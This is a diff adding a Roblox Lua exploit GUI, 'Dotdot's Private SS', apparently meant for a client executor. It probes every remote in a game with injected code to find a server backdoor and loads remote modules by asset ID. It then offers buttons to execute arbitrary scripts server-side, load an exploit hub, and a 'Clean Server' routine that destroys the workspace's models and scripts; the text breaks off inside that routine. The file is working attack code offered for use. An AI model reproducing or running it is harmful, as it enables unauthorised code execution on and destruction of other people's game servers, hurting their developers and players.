@@ -1,0 +1,976 @@
+local CollectionService = game:GetService("CollectionService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+getgenv().ignore = setmetatable({}, {__newindex = function() end})
+
+local GUI = {}
+
+local function dragify(Frame)
+    local dragToggle = nil
+    local dragStart = nil
+    local startPos = nil
+    local dragInput = nil
+    
+    Frame.InputBegan:Connect(function(input)
+        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
+            dragToggle = true
+            dragStart = input.Position
+            startPos = Frame.Position
+            input.Changed:Connect(function()
+                if (input.UserInputState == Enum.UserInputState.End) then
+                    dragToggle = false
+                end
+            end)
+        end
+    end)
+    Frame.InputChanged:Connect(function(input)
+        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            dragInput = input
+        end
+    end)
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if (input == dragInput and dragToggle) then
+            local Delta = input.Position - dragStart
+            local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+            game:GetService("TweenService"):Create(Frame, TweenInfo.new(.25), {Position = Position}):Play()
+        end
+    end)
+end
+
+local function createTween(object, properties, duration)
+    local tweenInfo = TweenInfo.new(duration or 0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    local tween = TweenService:Create(object, tweenInfo, properties)
+    tween:Play()
+    return tween
+end
+
+-- // MAIN SCANNER GUI // --
+GUI["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+GUI["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+GUI["ScreenGui_1"].Name = "Dotdot Private SS"
+GUI["ScreenGui_1"].ResetOnSpawn = false
+CollectionService:AddTag(GUI["ScreenGui_1"], "main");
+
+GUI["Frame_2"] = Instance.new("Frame", GUI["ScreenGui_1"]);
+GUI["Frame_2"]["BorderSizePixel"] = 0;
+GUI["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["Frame_2"]["Size"] = UDim2.new(0, 456, 0, 274);
+GUI["Frame_2"]["Position"] = UDim2.new(0, 210, 0, 12);
+GUI["Frame_2"]["BackgroundTransparency"] = 0.2;
+GUI["Frame_2"].Name = "Devil Bee BR Scanner"
+
+GUI["Close_3"] = Instance.new("TextButton", GUI["Frame_2"]);
+GUI["Close_3"]["TextWrapped"] = true;
+GUI["Close_3"]["BorderSizePixel"] = 0;
+GUI["Close_3"]["TextSize"] = 48;
+GUI["Close_3"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
+GUI["Close_3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Close_3"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+GUI["Close_3"]["BackgroundTransparency"] = 0.7;
+GUI["Close_3"]["Size"] = UDim2.new(0, 30, 0, 30);
+GUI["Close_3"]["Text"] = "×";
+GUI["Close_3"]["Name"] = "Close";
+GUI["Close_3"]["Position"] = UDim2.new(0, 422, 0, 4);
+Instance.new("UICorner", GUI["Close_3"])
+Instance.new("UICorner", GUI["Frame_2"])
+
+GUI["TextLabel_6"] = Instance.new("TextLabel", GUI["Frame_2"]);
+GUI["TextLabel_6"]["TextWrapped"] = true;
+GUI["TextLabel_6"]["BorderSizePixel"] = 0;
+GUI["TextLabel_6"]["TextSize"] = 12;
+GUI["TextLabel_6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+GUI["TextLabel_6"]["TextScaled"] = true;
+GUI["TextLabel_6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["TextLabel_6"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+GUI["TextLabel_6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["TextLabel_6"]["BackgroundTransparency"] = 1;
+GUI["TextLabel_6"]["Size"] = UDim2.new(0, 444, 0, 144);
+GUI["TextLabel_6"]["Text"] = "About Dotdot Private SS:											 It's private ss gng :/";
+GUI["TextLabel_6"]["Position"] = UDim2.new(0, 6, 0, 124);
+local grad7 = Instance.new("UIGradient", GUI["TextLabel_6"])
+grad7.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(168, 168, 168))}
+
+GUI["Title_8"] = Instance.new("TextLabel", GUI["Frame_2"]);
+GUI["Title_8"]["TextWrapped"] = true;
+GUI["Title_8"]["BorderSizePixel"] = 0;
+GUI["Title_8"]["TextSize"] = 28;
+GUI["Title_8"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+GUI["Title_8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Title_8"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+GUI["Title_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["Title_8"]["BackgroundTransparency"] = 0.7;
+GUI["Title_8"]["Size"] = UDim2.new(0, 414, 0, 30);
+GUI["Title_8"]["Text"] = "Dotdot's Private SS";
+GUI["Title_8"]["Name"] = "Title";
+GUI["Title_8"]["Position"] = UDim2.new(0, 4, 0, 4);
+Instance.new("UICorner", GUI["Title_8"])
+
+GUI["Scan_b"] = Instance.new("TextButton", GUI["Frame_2"]);
+GUI["Scan_b"]["TextWrapped"] = true;
+GUI["Scan_b"]["BorderSizePixel"] = 0;
+GUI["Scan_b"]["TextSize"] = 36;
+GUI["Scan_b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["Scan_b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Scan_b"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+GUI["Scan_b"]["BackgroundTransparency"] = 0.7;
+GUI["Scan_b"]["Size"] = UDim2.new(0, 448, 0, 56);
+GUI["Scan_b"]["Text"] = "Scan for backdoors";
+GUI["Scan_b"]["Name"] = "Scan";
+GUI["Scan_b"]["Position"] = UDim2.new(0, 4, 0, 38);
+Instance.new("UICorner", GUI["Scan_b"])
+
+local gradE = Instance.new("UIGradient", GUI["Frame_2"])
+gradE.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 0, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 0, 80))}
+
+GUI["Status_f"] = Instance.new("TextLabel", GUI["Frame_2"]);
+GUI["Status_f"]["TextWrapped"] = true;
+GUI["Status_f"]["BorderSizePixel"] = 0;
+GUI["Status_f"]["TextScaled"] = true;
+GUI["Status_f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Status_f"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+GUI["Status_f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["Status_f"]["BackgroundTransparency"] = 0.7;
+GUI["Status_f"]["Size"] = UDim2.new(0, 448, 0, 22);
+GUI["Status_f"]["Text"] = "Status:";
+GUI["Status_f"]["Name"] = "Status";
+GUI["Status_f"]["Position"] = UDim2.new(0, 4, 0, 98);
+Instance.new("UICorner", GUI["Status_f"])
+Instance.new("UIStroke", GUI["Frame_2"])
+
+-- // EXECUTOR GUI // --
+GUI["ScreenGui_13"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+GUI["ScreenGui_13"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+GUI["ScreenGui_13"].Name = "DevilBeeBRScanner"
+GUI["ScreenGui_13"].ResetOnSpawn = false
+GUI["ScreenGui_13"].Enabled = false
+CollectionService:AddTag(GUI["ScreenGui_13"], "main");
+
+GUI["Frame_14"] = Instance.new("Frame", GUI["ScreenGui_13"]);
+GUI["Frame_14"]["BorderSizePixel"] = 0;
+GUI["Frame_14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["Frame_14"]["Size"] = UDim2.new(0, 456, 0, 310);
+GUI["Frame_14"]["Position"] = UDim2.new(0, 210, 0, 12);
+GUI["Frame_14"]["BackgroundTransparency"] = 0.2;
+GUI["Frame_14"].Name = "DevilBeeBRScanmer"
+
+GUI["Close_15"] = Instance.new("TextButton", GUI["Frame_14"]);
+GUI["Close_15"]["TextWrapped"] = true;
+GUI["Close_15"]["BorderSizePixel"] = 0;
+GUI["Close_15"]["TextSize"] = 48;
+GUI["Close_15"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
+GUI["Close_15"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Close_15"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+GUI["Close_15"]["BackgroundTransparency"] = 0.7;
+GUI["Close_15"]["Size"] = UDim2.new(0, 30, 0, 30);
+GUI["Close_15"]["Text"] = "×";
+GUI["Close_15"]["Name"] = "Close";
+GUI["Close_15"]["Position"] = UDim2.new(0, 422, 0, 4);
+Instance.new("UICorner", GUI["Close_15"])
+
+-- Buttons Row 1 (Bottom)
+GUI["Sens_17"] = Instance.new("TextButton", GUI["Frame_14"]);
+GUI["Sens_17"]["BorderSizePixel"] = 0;
+GUI["Sens_17"]["TextScaled"] = true;
+GUI["Sens_17"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
+GUI["Sens_17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Sens_17"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+GUI["Sens_17"]["BackgroundTransparency"] = 0.7;
+GUI["Sens_17"]["Size"] = UDim2.new(0, 140, 0, 30);
+GUI["Sens_17"]["Text"] = "Sensation Hub";
+GUI["Sens_17"]["Name"] = "Sens";
+GUI["Sens_17"]["Position"] = UDim2.new(0, 158, 0, 240);
+Instance.new("UICorner", GUI["Sens_17"])
+
+GUI["Clean_Btn"] = Instance.new("TextButton", GUI["Frame_14"]);
+GUI["Clean_Btn"]["BorderSizePixel"] = 0;
+GUI["Clean_Btn"]["TextScaled"] = true;
+GUI["Clean_Btn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["Clean_Btn"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Clean_Btn"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+GUI["Clean_Btn"]["BackgroundTransparency"] = 0.7;
+GUI["Clean_Btn"]["Size"] = UDim2.new(0, 92, 0, 30);
+GUI["Clean_Btn"]["Text"] = "Clean Server";
+GUI["Clean_Btn"]["Name"] = "CleanServer";
+GUI["Clean_Btn"]["Position"] = UDim2.new(0, 304, 0, 240);
+Instance.new("UICorner", GUI["Clean_Btn"])
+
+GUI["Clr_25"] = Instance.new("TextButton", GUI["Frame_14"]);
+GUI["Clr_25"]["BorderSizePixel"] = 0;
+GUI["Clr_25"]["TextScaled"] = true;
+GUI["Clr_25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["Clr_25"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Clr_25"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+GUI["Clr_25"]["BackgroundTransparency"] = 0.7;
+GUI["Clr_25"]["Size"] = UDim2.new(0, 70, 0, 30);
+GUI["Clr_25"]["Text"] = "Clear";
+GUI["Clr_25"]["Name"] = "Clr";
+GUI["Clr_25"]["Position"] = UDim2.new(0, 82, 0, 240);
+Instance.new("UICorner", GUI["Clr_25"])
+
+GUI["Exe_28"] = Instance.new("TextButton", GUI["Frame_14"]);
+GUI["Exe_28"]["BorderSizePixel"] = 0;
+GUI["Exe_28"]["TextScaled"] = true;
+GUI["Exe_28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["Exe_28"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Exe_28"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+GUI["Exe_28"]["BackgroundTransparency"] = 0.7;
+GUI["Exe_28"]["Size"] = UDim2.new(0, 70, 0, 30);
+GUI["Exe_28"]["Text"] = "Execute";
+GUI["Exe_28"]["Name"] = "Exe";
+GUI["Exe_28"]["Position"] = UDim2.new(0, 6, 0, 240);
+Instance.new("UICorner", GUI["Exe_28"])
+
+-- [NEW] Copy Button
+GUI["Copy_Btn"] = Instance.new("TextButton", GUI["Frame_14"]);
+GUI["Copy_Btn"]["BorderSizePixel"] = 0;
+GUI["Copy_Btn"]["TextScaled"] = true;
+GUI["Copy_Btn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["Copy_Btn"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Copy_Btn"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+GUI["Copy_Btn"]["BackgroundTransparency"] = 0.7;
+GUI["Copy_Btn"]["Size"] = UDim2.new(0, 50, 0, 30);
+GUI["Copy_Btn"]["Text"] = "Copy";
+GUI["Copy_Btn"]["Name"] = "CopyBtn";
+GUI["Copy_Btn"]["Position"] = UDim2.new(0, 402, 0, 240);
+Instance.new("UICorner", GUI["Copy_Btn"])
+
+-- [NEW] Console Button (Small, near Title?)
+GUI["Console_Toggle_Btn"] = Instance.new("TextButton", GUI["Frame_14"]);
+GUI["Console_Toggle_Btn"]["BorderSizePixel"] = 0;
+GUI["Console_Toggle_Btn"]["TextSize"] = 14;
+GUI["Console_Toggle_Btn"]["TextColor3"] = Color3.fromRGB(200, 200, 200);
+GUI["Console_Toggle_Btn"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Console_Toggle_Btn"]["BackgroundTransparency"] = 0.5;
+GUI["Console_Toggle_Btn"]["Size"] = UDim2.new(0, 80, 0, 20);
+GUI["Console_Toggle_Btn"]["Text"] = "Console";
+GUI["Console_Toggle_Btn"]["Position"] = UDim2.new(0, 330, 0, 8); -- Top right ish
+Instance.new("UICorner", GUI["Console_Toggle_Btn"])
+
+local grad31 = Instance.new("UIGradient", GUI["Frame_14"])
+grad31.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 0, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 0, 80))}
+
+GUI["TextBox_32"] = Instance.new("TextBox", GUI["Frame_14"]);
+GUI["TextBox_32"]["CursorPosition"] = -1;
+GUI["TextBox_32"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+GUI["TextBox_32"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
+GUI["TextBox_32"]["BorderSizePixel"] = 0;
+GUI["TextBox_32"]["TextSize"] = 18;
+GUI["TextBox_32"]["TextColor3"] = Color3.fromRGB(50, 255, 50);
+GUI["TextBox_32"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+GUI["TextBox_32"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["TextBox_32"]["FontFace"] = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+GUI["TextBox_32"]["PlaceholderText"] = "Require script here...";
+GUI["TextBox_32"]["Size"] = UDim2.new(0, 444, 0, 200);
+GUI["TextBox_32"]["Position"] = UDim2.new(0, 6, 0, 36);
+GUI["TextBox_32"]["Text"] = "";
+GUI["TextBox_32"]["TextWrapped"] = true
+GUI["TextBox_32"]["BackgroundTransparency"] = 0.6;
+GUI["TextBox_32"]["ClearTextOnFocus"] = false
+
+GUI["Title_33"] = Instance.new("TextLabel", GUI["Frame_14"]);
+GUI["Title_33"]["TextWrapped"] = true;
+GUI["Title_33"]["BorderSizePixel"] = 0;
+GUI["Title_33"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+GUI["Title_33"]["TextScaled"] = true;
+GUI["Title_33"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Title_33"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+GUI["Title_33"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["Title_33"]["BackgroundTransparency"] = 0.7;
+GUI["Title_33"]["Size"] = UDim2.new(0, 320, 0, 30);
+GUI["Title_33"]["Text"] = "Dotdot's Private SS";
+GUI["Title_33"]["Name"] = "Title";
+GUI["Title_33"]["Position"] = UDim2.new(0, 4, 0, 4);
+Instance.new("UICorner", GUI["Title_33"])
+
+GUI["RequireHub_Btn"] = Instance.new("TextButton", GUI["Frame_14"]);
+GUI["RequireHub_Btn"]["BorderSizePixel"] = 0;
+GUI["RequireHub_Btn"]["TextScaled"] = true;
+GUI["RequireHub_Btn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["RequireHub_Btn"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["RequireHub_Btn"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+GUI["RequireHub_Btn"]["BackgroundTransparency"] = 0.7;
+GUI["RequireHub_Btn"]["Size"] = UDim2.new(0, 444, 0, 30);
+GUI["RequireHub_Btn"]["Text"] = "Require Hub";
+GUI["RequireHub_Btn"]["Name"] = "RequireHubBtn";
+GUI["RequireHub_Btn"]["Position"] = UDim2.new(0, 6, 0, 276);
+Instance.new("UICorner", GUI["RequireHub_Btn"])
+
+-- [NEW] Console GUI
+GUI["Console_Frame"] = Instance.new("Frame", GUI["ScreenGui_13"]);
+GUI["Console_Frame"]["Size"] = UDim2.new(0, 400, 0, 250);
+GUI["Console_Frame"]["Position"] = UDim2.new(0.5, -200, 0.5, 160); -- Below Exec
+GUI["Console_Frame"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
+GUI["Console_Frame"]["Visible"] = false;
+GUI["Console_Frame"]["Name"] = "Console";
+Instance.new("UICorner", GUI["Console_Frame"])
+Instance.new("UIStroke", GUI["Console_Frame"])
+
+GUI["Console_Title"] = Instance.new("TextLabel", GUI["Console_Frame"]);
+GUI["Console_Title"]["Size"] = UDim2.new(1, 0, 0, 25);
+GUI["Console_Title"]["BackgroundTransparency"] = 1;
+GUI["Console_Title"]["Text"] = "Console Logs";
+GUI["Console_Title"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["Console_Title"]["Font"] = Enum.Font.GothamBold;
+GUI["Console_Title"]["TextSize"] = 16;
+
+GUI["Console_Scroll"] = Instance.new("ScrollingFrame", GUI["Console_Frame"]);
+GUI["Console_Scroll"]["Size"] = UDim2.new(1, -10, 1, -30);
+GUI["Console_Scroll"]["Position"] = UDim2.new(0, 5, 0, 25);
+GUI["Console_Scroll"]["BackgroundColor3"] = Color3.fromRGB(10, 10, 10);
+GUI["Console_Scroll"]["BackgroundTransparency"] = 0.5;
+GUI["Console_Scroll"]["ScrollBarThickness"] = 4;
+GUI["Console_Scroll"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
+
+local ConsoleList = Instance.new("UIListLayout", GUI["Console_Scroll"])
+ConsoleList.SortOrder = Enum.SortOrder.LayoutOrder
+
+-- Require Hub Frame (Same as before)
+GUI["RequireHub_Frame"] = Instance.new("Frame", GUI["ScreenGui_13"]);
+GUI["RequireHub_Frame"]["BorderSizePixel"] = 0;
+GUI["RequireHub_Frame"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
+GUI["RequireHub_Frame"]["Size"] = UDim2.new(0, 400, 0, 300);
+GUI["RequireHub_Frame"]["Position"] = UDim2.new(0.5, -200, 0.5, -150);
+GUI["RequireHub_Frame"]["Visible"] = false
+GUI["RequireHub_Frame"]["Name"] = "RequireHub"
+Instance.new("UIStroke", GUI["RequireHub_Frame"])
+Instance.new("UICorner", GUI["RequireHub_Frame"])
+
+GUI["RequireHub_Title"] = Instance.new("TextLabel", GUI["RequireHub_Frame"]);
+GUI["RequireHub_Title"]["Size"] = UDim2.new(1, 0, 0, 40);
+GUI["RequireHub_Title"]["BackgroundTransparency"] = 1;
+GUI["RequireHub_Title"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["RequireHub_Title"]["TextSize"] = 24;
+GUI["RequireHub_Title"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+GUI["RequireHub_Title"]["Text"] = "Require Hub"
+
+GUI["RequireHub_Close"] = Instance.new("TextButton", GUI["RequireHub_Frame"]);
+GUI["RequireHub_Close"]["Size"] = UDim2.new(0, 30, 0, 30);
+GUI["RequireHub_Close"]["Position"] = UDim2.new(1, -35, 0, 5);
+GUI["RequireHub_Close"]["BackgroundColor3"] = Color3.fromRGB(200, 50, 50);
+GUI["RequireHub_Close"]["Text"] = "X"
+GUI["RequireHub_Close"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+Instance.new("UICorner", GUI["RequireHub_Close"])
+
+GUI["AutoFill_Toggle"] = Instance.new("TextButton", GUI["RequireHub_Frame"]);
+GUI["AutoFill_Toggle"]["Size"] = UDim2.new(0, 150, 0, 30);
+GUI["AutoFill_Toggle"]["Position"] = UDim2.new(0, 10, 0, 45);
+GUI["AutoFill_Toggle"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
+GUI["AutoFill_Toggle"]["Text"] = "Auto Fill Username: OFF"
+GUI["AutoFill_Toggle"]["TextColor3"] = Color3.fromRGB(255, 100, 100);
+GUI["AutoFill_Toggle"]["TextSize"] = 12;
+Instance.new("UICorner", GUI["AutoFill_Toggle"])
+
+GUI["Scroll_Container"] = Instance.new("ScrollingFrame", GUI["RequireHub_Frame"]);
+GUI["Scroll_Container"]["Size"] = UDim2.new(1, -20, 1, -90);
+GUI["Scroll_Container"]["Position"] = UDim2.new(0, 10, 0, 80);
+GUI["Scroll_Container"]["BackgroundTransparency"] = 0.5;
+GUI["Scroll_Container"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Scroll_Container"]["ScrollBarThickness"] = 6;
+GUI["Scroll_Container"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
+
+GUI["ListLayout"] = Instance.new("UIListLayout", GUI["Scroll_Container"]);
+GUI["ListLayout"]["Padding"] = UDim.new(0, 5);
+GUI["ListLayout"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
+dragify(GUI["Frame_2"])
+dragify(GUI["Frame_14"])
+dragify(GUI["RequireHub_Frame"])
+dragify(GUI["Console_Frame"])
+
+local backdoor = nil
+local autoFillEnabled = false
+local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}
+
+-- Console Logic
+local function Log(text)
+    local lbl = Instance.new("TextLabel", GUI["Console_Scroll"])
+    lbl.Size = UDim2.new(1, 0, 0, 20)
+    lbl.BackgroundTransparency = 1
+    lbl.TextColor3 = Color3.fromRGB(200, 255, 200)
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.Text = " > " .. tostring(text)
+    lbl.Font = Enum.Font.Code
+    lbl.TextSize = 14
+    GUI["Console_Scroll"].CanvasSize = UDim2.new(0, 0, 0, ConsoleList.AbsoluteContentSize.Y + 10)
+    GUI["Console_Scroll"].CanvasPosition = Vector2.new(0, 99999) -- Auto scroll
+end
+
+Log("Console Initialized.")
+
+local function runRemote(remote, data)
+    Log("Firing remote: " .. tostring(remote))
+    if remote:IsA('RemoteEvent') then
+        remote:FireServer(data)
+    elseif remote:IsA('RemoteFunction') then
+        spawn(function()
+            remote:InvokeServer(data)
+        end)
+    end
+end
+
+local function updateStatus(message, color)
+    GUI["Status_f"].Text = "Status: " .. message
+    GUI["Status_f"].TextColor3 = color or Color3.fromRGB(255, 255, 255)
+    Log("Status: " .. message)
+end
+
+local function generateName(length)
+    local text = ''
+    for i = 1, length do
+        text = text .. alphabet[math.random(1,#alphabet)]
+    end
+    return text
+end
+
+local function findRemote()
+    local remotes = {}
+    updateStatus("Starting Scan...", Color3.fromRGB(255, 255, 0))
+    
+    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
+    
+    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
+        local code = generateName(math.random(12,30))
+        spawn(function()
+            protected_backdoor:InvokeServer('nil', "a=Instance.new('Model',workspace)a.Name='"..code.."'")
+        end)
+        remotes[code] = protected_backdoor
+    end
+    
+    for i,remote in game:GetDescendants() do
+        -- [REMOVED PRINTING HERE AS REQUESTED]
+        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then continue end
+        if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then continue end
+        if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
+            if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then continue end
+            if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then continue end
+            if remote.Parent.Name=='DefaultChatSystemChatEvents' then continue end
+        end
+        
+        local code = generateName(math.random(12,30))
+        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
+        remotes[code] = remote
+    end
+    
+    for i = 1, 100 do
+        updateStatus("Scanning... "..i.."%", Color3.fromRGB(255, 255, 0))
+        for code,remote in remotes do
+            if workspace:FindFirstChild(code) then
+                backdoor = remote
+                GUI["ScreenGui_1"].Enabled = false
+                GUI["ScreenGui_13"].Enabled = true
+                runRemote(remote, "require(171016405.1884*69)")
+                updateStatus("Backdoor Found!", Color3.fromRGB(0, 255, 0))
+                return true
+            end
+        end
+        task.wait(0.05)
+    end
+    
+    updateStatus("No backdoor Found", Color3.fromRGB(255, 0, 0))
+    return false
+end
+
+local function buttonClickEffect(button)
+    createTween(button, {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}, 0.1)
+    task.wait(0.1)
+    createTween(button, {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.1)
+end
+
+GUI["Scan_b"].MouseButton1Click:Connect(function()
+    GUI["Scan_b"].Text = "Scanning..."
+    GUI["Scan_b"].TextColor3 = Color3.fromRGB(255, 255, 0)
+    buttonClickEffect(GUI["Scan_b"])
+    spawn(function()
+        if not findRemote() then
+            GUI["Scan_b"].Text = "Scan For Backdoors"
+            GUI["Scan_b"].TextColor3 = Color3.fromRGB(255, 255, 255)
+        end
+    end)
+end)
+
+GUI["Exe_28"].MouseButton1Click:Connect(function()
+    local scriptText = GUI["TextBox_32"].Text
+    if backdoor and scriptText ~= "" then
+        runRemote(backdoor, scriptText)
+        GUI["Exe_28"].Text = "Executed!"
+        buttonClickEffect(GUI["Exe_28"])
+        task.wait(0.5)
+        GUI["Exe_28"].Text = "Execute"
+    else
+        GUI["Exe_28"].Text = "No script!"
+        buttonClickEffect(GUI["Exe_28"])
+        task.wait(0.5)
+        GUI["Exe_28"].Text = "Execute"
+    end
+end)
+
+GUI["Clr_25"].MouseButton1Click:Connect(function()
+    GUI["TextBox_32"].Text = ""
+    GUI["Clr_25"].Text = "Cleared!"
+    buttonClickEffect(GUI["Clr_25"])
+    task.wait(0.5)
+    GUI["Clr_25"].Text = "Clear"
+end)
+
+GUI["Copy_Btn"].MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(GUI["TextBox_32"].Text)
+        GUI["Copy_Btn"].Text = "Copied"
+        task.wait(0.5)
+        GUI["Copy_Btn"].Text = "Copy"
+    else
+        Log("setclipboard not supported")
+        GUI["Copy_Btn"].Text = "Error"
+        task.wait(0.5)
+        GUI["Copy_Btn"].Text = "Copy"
+    end
+end)
+
+GUI["Console_Toggle_Btn"].MouseButton1Click:Connect(function()
+    GUI["Console_Frame"].Visible = not GUI["Console_Frame"].Visible
+end)
+
+GUI["Sens_17"].MouseButton1Click:Connect(function()
+    if backdoor then
+        local playerName = Players.LocalPlayer.Name
+        runRemote(backdoor, "require(100263845596551)('"..playerName.."', ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(128, 0, 128)), ColorSequenceKeypoint.new(0.25, Color3.fromRGB(102, 0, 153)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(153, 51, 255)), ColorSequenceKeypoint.new(0.75, Color3.fromRGB(75, 0, 130)), ColorSequenceKeypoint.new(1, Color3.fromRGB(128, 0, 128))}), \"Standard\")")
+        GUI["Sens_17"].Text = "Loaded!"
+        buttonClickEffect(GUI["Sens_17"])
+        task.wait(0.5)
+        GUI["Sens_17"].Text = "Sensation Hub"
+    end
+end)
+
+GUI["Clean_Btn"].MouseButton1Click:Connect(function()
+    if backdoor then
+        local cleanScript = [[
+            local ws = workspace
+            local rs = game:GetService("ReplicatedStorage")
+            for _, v in pairs(ws:GetDescendants()) do
+                if v:IsA("Model") or v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") or v:IsA("Folder") then
+                    pcall(function() v:Destroy() end)
+                end
+            end
